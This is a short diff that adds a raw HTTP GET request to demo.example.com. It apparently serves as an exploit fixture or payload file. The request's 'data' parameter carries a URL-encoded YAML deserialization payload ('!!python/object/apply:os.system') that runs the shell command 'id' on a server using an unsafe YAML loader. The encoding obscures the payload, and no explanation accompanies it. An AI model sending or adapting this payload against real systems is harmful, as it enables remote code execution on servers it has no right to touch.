@@ -1,0 +1,4 @@
+GET /a?data=%21%21%70%79%74%68%6F%6E%2F%6F%62%6A%65%63%74%2F%61%70%70%6C%79%3A%6F%73%2E%73%79%73%74%65%6D%20%5B%22%69%64%22%5D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
